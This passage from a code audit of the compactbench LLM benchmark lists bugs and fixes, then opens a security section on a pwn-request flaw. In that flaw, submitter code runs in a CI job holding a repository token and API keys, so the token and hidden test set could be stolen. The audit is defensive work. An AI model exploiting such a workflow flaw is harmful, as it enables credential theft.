The free-tier check (estimate.py:161-168) then prints "this run fits within the free-tier daily cap" for a configuration whose real token spend is several times the projection.
  - *Why:* `--estimate` exists specifically so users can size a run before committing quota — it is the gate between a curious user and a real spend. A projector that is 2x low and hands out false quota all-clears sends people straight into the TPD wall in finding #6, where they lose the entire run. It also means the maintainer cannot budget the hidden ranked evaluation.
  - *Fix:* Give `Compactor` a `estimate_calls_per_cycle(transcript) -> int` classmethod (naive/structured return 1, hybrid 2, hierarchical `ceil(len(turns)/CHUNK_SIZE)+2`) and call it from `estimate_run`. Add `drift_cycles` continuation calls per case with their own input/output envelope. Replace `transcript_tokens // 4` with the actual `build_evaluation_cached_prefix(CompactionArtifact())` preamble (98 tokens) plus a calibrated artifact envelope. Add a regression test that asserts the estimate is within 15% of a real mock run's `call_count` for each built-in method.
- **[P1 · BUG · S]** Provider errors escape the CLI as raw Python tracebacks
  - *Evidence:* src/compactbench/cli.py:132-136 wraps `asyncio.run(run_experiment(args))` in `except RunnerError`. `ProviderError` and `UnknownProviderError` derive from `Exception`, not `RunnerError` (providers/errors.py:6-15), and `_instantiate_provider` (run.py:277-280) raises them before any work starts. I ran `compactbench run --provider anthropic --model claude-3-5-haiku-latest` with no key set and got a 40-line rich traceback ending in `ProviderError: Anthropic API key required.` A typo'd provider key (`--provider openai-compatible`) produces the same traceback for `UnknownProviderError`. `iter_events`' `ValueError` on a corrupt resume file (persistence.py:131) escapes the same way.
  - *Why:* A traceback reads as 'this tool is broken', not 'you forgot a key'. This is the failure a brand-new user hits most often, and it is the difference between a 5-second fix and closing the tab.
  - *Fix:* In cli.py:134 change to `except (RunnerError, ProviderError, ValueError) as exc:` (importing `ProviderError` from `compactbench.providers`), or make `ProviderError` a subclass of a shared `CompactBenchError`. Also make `resolve_compactor_class`' and `iter_events`' failures land in the same handler. Two-line fix; add a CliRunner test asserting exit code 1 and no 'Traceback' in stderr.
- **[P1 · RISK · M]** Daily-quota 429s are fatal to the whole run rather than a graceful stop-and-resume
  - *Evidence:* src/compactbench/providers/_retry.py:21-47 `is_terminal_quota_error` matches TPD/RPD/'quota exceeded' markers, and anthropic.py:59-61, openai.py:53-55, groq.py:53-56 use it to return `False` from `_is_retryable`, so the `RateLimitError` propagates immediately — and per finding #1 that destroys the whole run with nothing persisted. docs/getting-started.md:41 advertises this as a feature: "auto-detects daily-quota 429s and surfaces them immediately (it will not retry futilely)". For the elite suite this is not an edge case: the measured hierarchical-summary run at `--case-count 5` is ~2200 calls against Groq's documented 100k tokens/day free-tier cap. `google_ai_studio.py:56-64` has the opposite bug — it never calls `is_terminal_quota_error`, so Gemini RPD exhaustion retries futilely three times.
  - *Why:* Hitting a daily cap is the *expected* outcome of a real run on a free tier, and it is perfectly recoverable — the right answer is 'stop, save what you have, resume tomorrow'. Instead it is the most expensive possible failure: everything already paid for is thrown away.
  - *Fix:* Introduce `QuotaExhaustedError(ProviderError)` raised by the predicate layer. In `run_experiment`, catch it in `_run_one`, set a `quota_exhausted` flag that stops the semaphore from admitting new cases, let in-flight cases finish, and write `RunEndEvent` with `notes=['stopped early: provider daily quota exhausted — re-run with --resume']`. Print that guidance from the CLI with exit code 2. Add the terminal-quota check to `google_ai_studio._is_retryable`. Also bound the `_TERMINAL_QUOTA_MARKERS` 'tpd'/'rpd' entries with word boundaries — as bare substrings they can false-positive on a random request-id and convert a recoverable per-minute 429 into a fatal one.
- **[P1 · BUG · S]** Re-running the same command without --resume silently truncates the previous results file
  - *Evidence:* src/compactbench/runner/run.py:83-97 — `mode` stays `"write"` unless `args.resume and args.output_path.exists()`, and `ResultsWriter.__init__` (persistence.py:82) does `path.open('w')`, truncating. There is no existence check, no prompt, no backup. Verified: a completed 10-line `results.jsonl` re-run without `--resume` came back as a fresh 10-line file with a new `run_id`; the prior run was gone. The CLI's `--output` default is the fixed path `Path("results.jsonl")` (cli.py:74), so every run in a directory targets the same file.
  - *Why:* After a crash (finding #1) the natural reflex is to press up-arrow and re-run — which destroys whatever partial results did survive. This is unrecoverable data loss of paid API work, triggered by the most obvious user action.
  - *Fix:* Refuse to open an existing non-empty output path in `"write"` mode: raise `RunnerError(f"{path} already exists. Pass --resume to continue it, --force to overwrite, or -o to write elsewhere.")`. Add `--force`. Consider defaulting `--output` to `results/<method>-<suite>-<timestamp>.jsonl` (there is already an unused `Settings.results_dir` at config.py:35).
- **[P1 · BUG · S]** --resume does not check method_version, suite_version, scorer_version, or benchmarks_dir
  - *Evidence:* src/compactbench/runner/run.py:290-316 `_assert_resume_compatible` compares `method_name`, `suite_key`, `target_provider`, `target_model`, `difficulty`, `drift_cycles`, `seed_group`, `case_count_per_template` — and nothing else. `compactor_cls.version` is available at the call site (it is written into `RunStartEvent.method_version` at run.py:104) but never compared. `SCORER_VERSION` (persistence.py:26) and `suite_version` (run.py:96) are likewise recorded and never compared. `args.benchmarks_dir` is not compared either, so resuming with `--benchmarks-dir` pointed at a different tree that happens to contain the same suite key is accepted.
  - *Why:* You can edit your compactor, bump its version, resume, and get a single results.jsonl whose `run_start` claims method-version 1.0.0 while half its cases were produced by 2.0.0 — and `to_run_result` will happily aggregate them into one leaderboard number. Same for editing a template mid-run or upgrading compactbench between resume attempts. Since finding #1 makes resume the normal path rather than the exception, this is a live route to a wrong published number.
  - *Fix:* Add `method_version`, `suite_version` and `scorer_version` to the mismatch list in `_assert_resume_compatible`, and record + compare a `benchmarks_digest` (see finding #9). Allow an explicit `--resume-allow-version-drift` escape hatch that stamps a note onto `RunEndEvent`. Extend `tests/unit/test_runner_run.py::test_resume_rejects_incompatible_args` to cover each new field.
- **[P1 · GAP · M]** results.jsonl records nothing that makes a number reproducible or attributable
  - *Evidence:* `RunStartEvent` (src/compactbench/runner/persistence.py:29-45) carries run_id, method name/version, suite key/version, scorer_version, target_provider, target_model, difficulty, drift_cycles, seed_group, case_count_per_template, started_at. Missing: the compactbench library version, the provider SDK version, the *resolved* model snapshot, temperature, max_tokens, concurrency, and any content digest of the benchmark suite. `CompletionResponse.model` (providers/base.py:51) captures what the API actually served — e.g. `claude-3-5-sonnet-20241022` when the user typed `claude-3-5-sonnet-latest` — and is discarded; nothing downstream reads it. Temperature is hardcoded at `CompletionRequest.temperature: float = 0.0` (base.py:39) and no caller ever overrides it, but the value is not recorded and is not sufficient for determinism: no provider is sent a `seed` even though `AsyncCompletions.create` in the installed openai SDK accepts `seed`, and Groq/Gemini do too. `system_fingerprint` is not captured. `SCORER_VERSION` is a hand-maintained string constant that nothing enforces on scorer changes. Case generation itself *is* deterministic (SHA-256 in engine/seeds.py:29-31 and dsl/generators.py:24-26) — the nondeterminism is entirely model-side and entirely unrecorded.
  - *Why:* Two people running the identical command against `claude-3-5-sonnet-latest` six months apart hit different weights and there is no record of which. A leaderboard row is only meaningful if a reviewer can tell what produced it; right now they cannot even tell which version of compactbench wrote the file. This is the difference between a benchmark and a screenshot.
  - *Fix:* Add to `RunStartEvent`: `compactbench_version` (from `compactbench.__version__`), `provider_sdk_version`, `temperature`, `max_tokens`, `concurrency`, `benchmarks_digest` (sha256 over the sorted template file bytes), and `endpoint_kind` ('default'|'custom', feeding PR #37's flag — see finding #17). Add `resolved_model: str | None` to `CycleResult`, populated from `CompletionResponse.model` via `CountingProvider` (record the last-seen value alongside the token counters). Add `seed: int | None` to `CompletionRequest` and pass `request.seed` to OpenAI/Groq/Gemini; derive it from `case_seed`. Publish a short 'what makes a run reproducible' section and have `qualify()` reject runs whose `compactbench_version`/`scorer_version` predate the current minor.
- **[P1 · BUG · S]** A one-template version bump silently changes the seed of every case in the suite
  - *Evidence:* src/compactbench/runner/run.py:283-287 `_suite_version` returns the single shared version if all templates agree, else the literal string `"mixed"`. That value goes into the per-template seed namespace at run.py:128: `seed_namespace = f"{args.suite_key}@{suite_version}/{template.key}@{template.version}"`, which feeds `derive_case_seed` (engine/seeds.py:29). So bumping one template from 1.0.0 to 1.0.1 flips `suite_version` from `"1.0.0"` to `"mixed"` for *all twenty* templates, changing every case seed in the suite and therefore every generated case. `estimate.py:87` mirrors the same construction, and cli.py:164-165 duplicates the logic a third time.
  - *Why:* Editing one template invalidates every historical number on the whole suite, with no error and no visible signal — case IDs change, so `--resume` also silently reruns everything. For a benchmark whose value proposition is comparable numbers over time, this is a landmine sitting directly on the maintenance path (fixing a typo in one hidden template).
  - *Fix:* Drop the suite-wide version from the namespace: use `f"{suite_key}/{template.key}@{template.version}"`. Per-template versioning already gives the isolation the namespace was designed for (run.py:124-127). Keep `_suite_version` only for the `RunStartEvent` field, and replace it there with the `benchmarks_digest` from finding #9. De-duplicate the three copies into one helper. Add a test asserting that bumping one template's version leaves other templates' derived case seeds unchanged.
- **[P1 · GAP · M]** Artifacts, model responses, compactor warnings and finish_reason are all discarded — a submitter cannot debug their own method
  - *Evidence:* `execute_cycle` returns the `CompactionArtifact` (runner/cycle.py:91-97) but `_execute_case` uses it only to feed the next cycle and builds a `CycleResult` from the scorecard alone (run.py:245-253). `CycleResult` (contracts/result.py:77-88) has no field for the artifact, the raw model responses, or warnings. The `responses: dict[str, str]` from `evaluate_items` (runner/evaluation.py:114) is consumed by `score_cycle` and dropped. `ItemScore.details` exists in the contract (contracts/result.py:61) and `scorer.score_item` always sets it to `{}` (scoring/scorer.py:42). `CompactionArtifact.warnings` — where `parse_state` reports 'response was not valid JSON' (compactors/_state_parser.py:40) — is never persisted. `CompletionResponse.raw` carries `finish_reason`/`stop_reason` (openai.py:116, anthropic.py:133) and is read by exactly one line in the codebase: `counting.py:72`, for cached-token extraction. There is no `--save-artifacts` flag.
  - *Why:* Someone building a compaction method sees 'entity_integrity mean 0.31' and has literally no way to find out what their compactor produced or what the model answered. A `max_tokens`-truncated artifact, a JSON parse failure on every cycle, and a genuinely bad method all look identical in the output. This is the single biggest reason a would-be submitter gives up, and it directly blocks the submissions the project needs right now.
  - *Fix:* Add `--save-artifacts <dir>` to `compactbench run` that writes one JSON per (case, cycle) containing the artifact, the `{item_key: response}` map, and the per-item expected spec. Populate `ItemScore.details` with `{'response': response[:500], 'expected': spec}` in `score_item`. Add `warnings: list[str]` and `finish_reasons: list[str]` to `CycleResult` (fed from `artifact.warnings` and from a new `CountingProvider` accumulator over `raw['finish_reason']`/`raw['stop_reason']`). Surface a 'truncated completions: N' row in `compactbench score`.
- **[P1 · BUG · M]** Empty or reasoning-only completions silently score 0 instead of erroring — the vLLM/reasoning-model gap PR #37's author flagged
  - *Evidence:* openai.py:97-98 does `text_raw = getattr(message, 'content', None) or ''` and returns `text=''` when content is None. groq.py:93 (`choice.message.content or ""`), ollama.py:93, and google_ai_studio.py:98 do the same. Only `anthropic.py:113-114` raises `ProviderResponseError` on no text. Downstream, `scorer.score_cycle:78` scores a missing key as `responses.get(item.key, "")`, so an empty answer is scored as a wrong answer worth 0.0. Reasoning models served through vLLM/OpenRouter return the answer in `reasoning_content` (or a `reasoning` field) with `content=None`; OpenAI refusals put text in `message.refusal`; a `finish_reason='length'` truncation also yields short or empty content. `CompletionRequest` (base.py:35-41) has no `extra_body`, no `max_completion_tokens`, and no `reasoning_effort`, though the installed openai SDK accepts all three — so there is no way to pass `chat_template_kwargs={'enable_thinking': False}` to a vLLM server, which is exactly the gap jaaabir raised on PR #37.
  - *Why:* A run against any reasoning model scores near-zero for reasons that have nothing to do with the compaction method under test. If that number reached the leaderboard it would be flatly wrong, and the submitter would have no way to tell (finding #11). It also makes the single most-requested deployment target from PR #37 — self-hosted vLLM — produce garbage rather than an error.
  - *Fix:* Add `extra_body: dict[str, Any] | None` and `max_completion_tokens: int | None` to `CompletionRequest`; pass `extra_body` through in `openai.py` and switch to `max_completion_tokens` when the model matches a reasoning-model pattern (o1/o3/gpt-5) since those reject `max_tokens` and `temperature != 1` — note costs.py:41 already prices `('openai','o1-mini')`, a model the provider currently cannot call. In `openai.py`, fall back to `message.reasoning_content` / `message.refusal` when `content` is None, and raise `ProviderResponseError` if all are empty. Make every provider raise `ProviderResponseError` on empty text so it becomes a case failure (finding #1) rather than a silent 0. Add `COMPACTBENCH_OPENAI_EXTRA_BODY` (JSON) so vLLM users can set `chat_template_kwargs` without code.
- **[P1 · RISK · M]** Prompt caching is a measured no-op at this benchmark's prompt sizes, and the docs quantify savings that cannot occur
  - *Evidence:* `build_evaluation_cached_prefix` (runner/evaluation.py:47-73) is the only cached prefix in the system. I measured it with tiktoken cl100k_base: **98 tokens** for an empty artifact and **615 tokens** for a deliberately generous one (250-word summary + 8 facts + 6 decisions + 5 forbidden + 6 unresolved + 6 entities). OpenAI's automatic prompt caching requires a stable prefix of ≥1024 tokens — openai.py:61-63 says exactly this and then relies on it. Anthropic's `cache_control: ephemeral` minimum is 1024 tokens (2048 for Haiku); anthropic.py:74-82 attaches the block unconditionally. Elite-practice transcripts average 201.75 tokens over 12.75 turns, so the artifacts derived from them are far below both minima. Consequently `cached_prompt_tokens` will be 0 on every real run and the `prompt_cache_hit_rate` row in `compactbench score` (cli.py:328-333) will never render. docs/getting-started.md claims "~90% input-cost drop on cache hits", "This saves roughly 40–60% of input tokens on the evaluation layer for Anthropic and OpenAI runs", and "real spend is typically lower than the estimate on those two providers" — the last is doubly wrong given finding #4.
  - *Why:* A published cost claim that is 0% instead of 40-60%, alongside an estimator that is 2x low, means users budget a run and get billed multiples of what they were told. It also means an entire shipped feature is dead weight nobody has noticed because there has never been a real run to notice it in.
  - *Fix:* Either (a) delete the caching claims from docs/getting-started.md and the `base.py:23-27` docstring and mark `cached_prefix` as a forward-looking hint, or (b) make it real: only attach Anthropic's `cache_control` when the prefix exceeds the model's minimum (add a `min_cacheable_tokens` per-provider constant and a tiktoken length check), and pass OpenAI's `prompt_cache_key` — available in the installed SDK — so caching is keyed rather than prefix-inferred. Either way, add an integration check that asserts `cached_prompt_tokens > 0` on a run designed to exceed the minimum, so the claim is enforced rather than asserted.
- **[P1 · GAP · M]** No progress output, no ETA, no timeouts on runs that take hours
  - *Evidence:* `grep -rn 'print|console|logger|logging' src/compactbench/runner src/compactbench/providers` returns zero hits outside a comment in costs.py. `run_experiment` prints nothing from start to finish; cli.py:138 prints `wrote <path>` only after everything completes. No provider sets an HTTP timeout on its client (anthropic.py:47, openai.py:46, groq.py:46, google_ai_studio.py:48, ollama.py:44 all construct with default timeouts — openai/anthropic default to 600s), and there is no per-call, per-case, or whole-run wall-clock budget. `evaluate_items` (evaluation.py:109-114) is a serial `for` loop, so the only parallelism is the 4-case semaphore. A default ranked configuration (20 templates × 20 cases × 3 cycles) is ~5,000 calls; at 4-way concurrency and 3s/call that is roughly 70 minutes of complete silence. A single hung call permanently occupies one of the four semaphore slots.
  - *Why:* Users cannot distinguish 'running' from 'hung', so they Ctrl-C — which (finding #1 + finding #7) loses everything and then the retry truncates the file. `rich` is already a dependency and `estimate_run` already computes `total_calls`, so an accurate progress bar with ETA is nearly free.
  - *Fix:* Pass an optional `on_case_complete: Callable[[CaseResult, int, int], None]` into `run_experiment` and wire a `rich.progress.Progress` bar from the CLI showing `cases done / total`, running mean score, cumulative tokens, and ETA derived from observed per-case latency. Add `--timeout` (default 120s) threaded into every provider's client constructor, plus an `asyncio.wait_for` around `_run_one`. Add `--max-cost-usd` that aborts gracefully (writing run_end) when the running `TokenUsage` × `costs.lookup_cost` exceeds the cap.
- **[P1 · STALE · M]** Provider SDKs are unpinned and every provider test mocks the SDK, so CI cannot catch a wire-format break
  - *Evidence:* pyproject.toml:45-51 pins `openai>=1.50`, `anthropic>=0.40`, `groq>=0.9`, `google-genai>=0.3`, `ollama>=0.3` with no upper bounds. The versions actually resolved in this checkout are **openai 3.3.1** and **anthropic 1.0.0** — two and one major versions past what the code was written against in April 2026. Every provider test patches the client (`_mock_create(provider)` in tests/unit/test_providers_openai.py), so the suite passes 479/479 regardless of what the real SDK does. There is no VCR/cassette test, no live smoke job, and no nightly against the real APIs.
  - *Why:* A new user `pip install compactbench[providers]` today gets SDK majors this code has never been exercised against. Whether or not something is currently broken, the project has no way to know — and 'I installed it and it errored' is exactly the outcome that keeps the submission count at zero. Six unreviewed dependabot PRs sitting open reinforce that dependency drift is unmonitored.
  - *Fix:* Add upper bounds (`openai>=1.50,<4`, `anthropic>=0.40,<2`, etc.) and a `uv.lock`-based reproducible install path documented in getting-started. Record cassettes (pytest-recording / vcrpy) for one happy call and one 429 per provider and run them in CI. Add an optional nightly workflow gated on `secrets.*_API_KEY` that runs `--suite starter --case-count 1` against each provider and opens an issue on failure. Merge/close the six dependabot PRs and enable auto-merge for patch bumps.
- **[P1 · RISK · M]** Partial and hand-edited runs pass leaderboard qualification — a submitter can cherry-pick by stopping early
  - *Evidence:* `to_run_result` (runner/persistence.py:184-194) silently reconstructs aggregates from whatever `case_complete` lines exist when `run_end` is absent, adding only a `notes` string. `qualify` (leaderboard/qualification.py:25-74) checks compression tier, contradiction rate, per-case cycle count, and per-family means — it never checks that `run_result.cases` has the expected count (`case_count_per_template` × template count is not even passed in), never inspects `notes`, and never cross-checks the `run_end` aggregates against the case list. I demonstrated this: an interrupted run wrote 8 of 12 cases and `compactbench score` printed a full, normal-looking aggregate table (`overall_score 0.413`) with a single yellow note at the bottom. The surviving cases are the ones that finished first, which is a biased sample. Deleting low-scoring `case_complete` lines by hand and dropping `run_end` produces an inflated score that `qualify()` accepts. `to_run_result` also sets `completed_at = run_start.started_at` for interrupted runs (persistence.py:187), so a partial run reports zero duration.
  - *Why:* The leaderboard is the product. The hidden-set workflow protects against test-set memorisation but not against a truncated or edited results file, and `scripts/rebuild_leaderboard.py:60` feeds `to_run_result` output straight into ranking. Getting this right before the first entry lands is far cheaper than retrofitting it after.
  - *Fix:* Add `expected_case_count` to `RunStartEvent` (templates × case_count) and make `qualify()` fail when `len(run_result.cases) != expected_case_count`, when `run_result.notes` contains the missing-run_end marker, or when recomputing `aggregate_run_metrics(cases)` disagrees with the persisted `run_end` values beyond float tolerance. Add a `RunResult.complete: bool` field so partial runs are structurally distinguishable rather than distinguishable by prose. Have `compactbench score` print a red PARTIAL RUN banner above the tables instead of a note below them.
- **[P1 · STRATEGY · S]** PR #37 (OpenAI base_url) is sound and should merge, but its provenance flag currently goes nowhere
  - *Evidence:* The diff is correct and well-tested: `base_url` constructor arg + `COMPACTBENCH_OPENAI_BASE_URL`, the key becomes optional only on the base-url path (the negative case is explicitly tested in `test_still_requires_a_key_without_a_base_url`), six new tests, and a docs table row. The one substantive gap: it records provenance as `raw['custom_base_url'] = self._base_url is not None`, but `CompletionResponse.raw` is consumed by exactly one line in the entire codebase — `counting.py:72`, for cached-token extraction — and is never persisted to `results.jsonl`. So the flag a leaderboard reviewer is supposed to see never reaches them. It also does not add `openai`/`anthropic` rows to the `providers list` notes dict (cli.py:411-416, both currently blank), does not add `openai_base_url` to `config.Settings`, and its docs edit repeats two existing inaccuracies (elite_practice has 20 templates, not 15; the ~450-call figure is ~2,200 for hierarchical-summary per finding #4).
  - *Why:* This is the only outside code contribution the project has, it has sat 18 days unreviewed, and it unlocks the entire OpenAI-compatible ecosystem (vLLM, llama.cpp, LM Studio, Together, Fireworks, OpenRouter) — which is what makes running the benchmark cheap enough for people to actually do it. Merging it promptly, with a short review that credits the author and names the follow-up, is the highest-leverage signal available that this project is alive.
  - *Fix:* Merge as-is after resolving the `mergeable_state=blocked` branch protection, then land a follow-up (ideally offered to jaaabir): thread the flag into `RunStartEvent` as `endpoint_kind: Literal['default','custom']` sourced from the provider instance at run.py:76 so it lands in results.jsonl; fill in the `providers list` notes for `openai`/`anthropic` including `COMPACTBENCH_OPENAI_BASE_URL`; add `openai_base_url` to `Settings`; fix the 15→20 template count and the call-count figure. Track the reasoning-model `extra_body` gap the author raised as its own issue (finding #12).
- **[P2 · GAP · S]** TokenUsage under-counts real billed tokens whenever a call is retried, and has no reasoning-token field
  - *Evidence:* `CountingProvider.complete` (providers/counting.py:67-74) tallies only the successful `CompletionResponse`; tokens consumed by attempts that failed inside `retry_with_backoff` are invisible. Worse, the openai and anthropic SDKs perform their *own* internal retries (default `max_retries=2`) that neither provider disables, so a single `complete()` can make up to 9 HTTP attempts while `TokenUsage.call_count` increments by 1. `TokenUsage` (contracts/result.py:34-37) has `prompt_tokens`, `completion_tokens`, `cached_prompt_tokens`, `call_count` — no `reasoning_tokens`, though OpenAI reports them under `usage.completion_tokens_details.reasoning_tokens` (folded into `completion_tokens`, so the total is right but reasoning cost is not separable) and Anthropic reports `cache_creation_input_tokens` (captured in `raw` at anthropic.py:132 but never summed). Minor related nit: every built-in compactor writes `"provider": self.provider.key` into `methodMetadata` (e.g. naive_summary.py:49), which now reads `"counting"` because run.py:154-155 hands it the wrapper.
  - *Why:* `compactbench score` presents the token table as the authoritative cost of a run. Under the retry-heavy conditions findings #2 and #6 describe, it will read materially lower than the provider's invoice, which undermines the cost axis of the benchmark.
  - *Fix:* Pass `max_retries=0` to the openai/anthropic SDK constructors so the wrapper owns retry policy exclusively, and have `retry_with_backoff` report attempt counts back so `CountingProvider` can add a `failed_call_count`. Add `reasoning_tokens` and `cache_creation_tokens` to `TokenUsage` (both default 0, additive like the rest) and extract them in `_extract_cached_tokens`' sibling. Have compactors record `self.provider.wrapped.key` when the provider is a `CountingProvider`.
- **[P2 · BUG · S]** Resume appends a duplicate run_end event on every resumed run
  - *Evidence:* src/compactbench/runner/run.py:193-205 unconditionally writes a `RunEndEvent` at the end of `run_experiment`, including when `pending` is empty because every case was already done. Verified: a completed 10-line file resumed once became 11 lines with 2 `run_end` events, resumed again 12 lines with 3. `to_run_result` (persistence.py:163-169) assigns `run_end = event` on each non-start/non-case event, so the last one wins and scoring still works — but the file is no longer the documented one-start/N-case/one-end shape that persistence.py:3-8 promises, and any external JSONL consumer parsing it positionally will break.
  - *Why:* Cosmetic today, but results.jsonl is the interchange format submissions are built on; the format should match its own docstring before third parties start writing tooling against it.
  - *Fix:* On resume, seek to and truncate any trailing `run_end` line before appending new events (or rewrite the file atomically at close). Alternatively skip writing `run_end` when `pending` is empty and the file already has one. Add a persistence test asserting exactly one `run_end` after N resumes.
- **[P2 · BUG · S]** `providers list` shows blank notes for anthropic and openai, hiding their env var names
  - *Evidence:* src/compactbench/cli.py:411-416 — the `notes` dict has entries for `mock`, `groq`, `google-ai-studio`, `ollama`. `anthropic` and `openai` were added to the registry in PR #19 (providers/__init__.py:26-27) and the dict was never updated. Verified by running `compactbench providers list`: both rows render with an empty Notes column.
  - *Why:* `providers list` is the natural discovery command for 'how do I configure this'. For the two providers a paying user is most likely to choose, it shows nothing — so they go hunting through docs, where finding #3 tells them to use a `.env` that does not work.
  - *Fix:* Add `"anthropic": "Anthropic. Set COMPACTBENCH_ANTHROPIC_API_KEY."` and `"openai": "OpenAI or any OpenAI-compatible server. Set COMPACTBENCH_OPENAI_API_KEY (and COMPACTBENCH_OPENAI_BASE_URL for vLLM/LM Studio/OpenRouter)."`. Better: move the note onto the `Provider` class as a `description: ClassVar[str]` so a new provider cannot be registered without one, and add a test asserting every registered key has a non-empty note.
- **[P2 · STALE · S]** Provider HTTP clients are never closed, and the cost catalogue is four months stale
  - *Evidence:* `Provider` (providers/base.py:55-62) declares only `complete`; there is no `aclose`/`__aexit__`, and `run_experiment` never closes the provider it constructs at run.py:76. `AsyncAnthropic`/`AsyncOpenAI`/`AsyncGroq` each hold an `httpx.AsyncClient` that is left to the garbage collector at `asyncio.run()` teardown. Separately, `runner/costs.py:16` stamps `CATALOGUE_UPDATED = "2026-04-18"` — four months stale — and its 14 entries are the only source for `--estimate`'s dollar figures. `costs.py:41` prices `('openai','o1-mini')`, a model the current provider cannot successfully call (finding #12). Neither `lookup_cost` nor `format_estimate` surfaces `CATALOGUE_UPDATED` to the user.
  - *Why:* Unclosed-client warnings at exit read as instability to a first-time user. A silently stale price table means the one dollar figure the tool prints is unfalsifiable — the user has no way to know it is four months old.
  - *Fix:* Add an optional `async def aclose(self) -> None` to `Provider` (no-op default), implement it on each SDK-backed provider, and wrap provider construction in `run_experiment` with `try/finally: await provider.aclose()`. Print `(prices as of {CATALOGUE_UPDATED})` in `format_estimate` and add a CI check that fails when the catalogue is more than 180 days old. Refresh the 14 entries and drop or fix `o1-mini`.
- **[P2 · IMPROVEMENT · S]** Persistence re-reads the whole results file three times on resume and raises bare ValueError on corruption
  - *Evidence:* `iter_events` (runner/persistence.py:114-115) does `fp.readlines()` — the entire file into memory. Resume calls it three times: `read_run_start` (run.py:84), `completed_case_ids` (run.py:88), and the aggregation loop (run.py:186). `to_run_result` reads it a fourth time at score time. A ranked run's file (400 cases × 3 cycles × full `item_scores`) is tens of MB. `read_run_start` (persistence.py:136-140) also loops over `iter_events` when it only needs line 1. Mid-file parse failures raise a bare `ValueError` (persistence.py:131) which is not a `RunnerError` and therefore escapes the CLI as a traceback (finding #5).
  - *Why:* Not a correctness problem today, but resume is about to become the normal path once findings #1 and #6 are fixed, and O(4×file) reads with everything held in memory will start to hurt exactly on the large ranked runs that matter most.
  - *Fix:* Make `iter_events` stream (`for line in fp`) instead of `readlines()`, tracking the previous line so the truncated-final-line tolerance still works. Have `read_run_start` read only the first line. Merge the resume-time `read_run_start` + `completed_case_ids` + already-done-case collection into one pass returning a small dataclass. Wrap the parse failure in `ResumeError`/`RunnerError` so the CLI handles it.
- **[P2 · BUG · S]** Groq omits InternalServerError from its retry predicate; Ollama omits common httpx transport errors
  - *Evidence:* src/compactbench/providers/groq.py:51-57 imports and matches only `RateLimitError | APITimeoutError | APIConnectionError`. The groq SDK also exposes `InternalServerError` (5xx), which anthropic.py:62-65 and openai.py:56-59 both correctly treat as retryable — so a Groq 500/502/503 is fatal where the same condition on OpenAI retries. ollama.py:52-58 retries only `httpx.TimeoutException | httpx.ConnectError` plus `ResponseError` with a 429/5xx status; `httpx.ReadError`, `httpx.RemoteProtocolError` and `httpx.WriteError` — the common failures when a local Ollama server is swapping models or under memory pressure — are not retried.
  - *Why:* Combined with finding #1, a single Groq 503 or a local Ollama hiccup takes down the whole run. Ollama is the zero-cost on-ramp the getting-started guide leads with, so its transport errors are the ones a first-time user is most likely to hit.
  - *Fix:* Add `InternalServerError` to the groq import and predicate at groq.py:51-57. Broaden the Ollama predicate to `isinstance(exc, httpx.TransportError)` (the base class covering timeout, connect, read, write and protocol errors). Add a shared parametrised test over all providers asserting that a 500, a 429, a timeout and a connection error are each classified retryable, so a new provider cannot ship with an incomplete predicate.

### Security

*The submission pipeline and the hidden set — 18 findings*

The submission-evaluation pipeline is both broken and unsafe. It is broken in a way that fully explains issue #38: `evaluate-submission.yml` resolves the submission directory with `git diff <base.sha> <head.sha>` against a depth-1 checkout, which always fails ("fatal: bad object", reproduced locally), so every evaluation run dies before it ever reaches the runner — the workflow has literally never produced a result. It is unsafe because it is a textbook pwn-request: `pull_request_target` + `contents: write` + checkout of the submitter's PR head + `uv sync`/`uv pip install` of submitter-controlled metadata + `importlib.exec_module` of submitter Python, all in one job that holds `HIDDEN_REPO_TOKEN` and two provider API keys, with zero egress control. The hidden ranked set is cloned to `/tmp/hidden` with the PAT embedded in the clone URL (git persists it in `.git/config`), and the path is then handed to the submitter's own process on the command line — so a malicious submitter can steal both the hidden set and the token that regenerates it. Separately, `rebuild_leaderboard.py` ranks whatever `results.jsonl` a submitter committed with no provenance check at all, so the very first published numbers can be fabricated. Fix the shallow-clone bug and the pipeline isolation together, before any submission is accepted.

- **[P0 · BUG · S]** Evaluate workflow can never succeed: `git diff base..head` on a depth-1 checkout
  - *Evidence:* .github/workflows/evaluate-submission.yml:30-35 checks out `ref: ${{ github.event.pull_request.head.sha }}` with no `fetch-depth`, so actions/checkout defaults to `fetch-depth: 1` — only the head commit exists locally. Lines 57-77 then run `git diff --name-only ${{ ...base.sha }} ${{ ...head.sha }} -- 'submissions/**' | awk ... | grep -v '^submissions/_template' || true`. The base SHA was never fetched, so git exits 128 with `fatal: bad object <sha>`; the `|| true` swallows it, `changed_dirs` is empty, `count=0`, and line 68-71 hard-fails with `::error::PR does not touch any submissions/<handle>/<method>/ directory.` Reproduced locally: `git clone --depth 1 file:///home/user/compactbench` then `git diff <HEAD~3-sha> HEAD` → `fatal: bad object 34d12d5...`, exit 128.
  - *Why:* This is the single line that makes issue #38 ("not a single bench run — what to compare with?") true. The flagship submission path has never worked and cannot work; any first submitter who arrives because of the current outside interest will hit an error that blames *them* for a maintainer bug. Nothing else in the security hardening below matters if the pipeline cannot execute one submission end to end.
  - *Fix:* Add `fetch-depth: 0` to the checkout at line 32-35 (or fetch the base explicitly: `git fetch --depth=1 origin ${{ github.event.pull_request.base.sha }}`). Better: drop git entirely and enumerate changed paths from the API in an `actions/github-script` step (`github.rest.pulls.listFiles`), which is both correct and immune to the shell-injection issue below. Then add a dry-run smoke test: a `submissions/_selftest/baseline/` fixture wired to `--provider mock` so the workflow is exercised on every change to it.
- **[P0 · RISK · L]** Pwn-request: submitter code executes in the same job that holds HIDDEN_REPO_TOKEN and provider keys
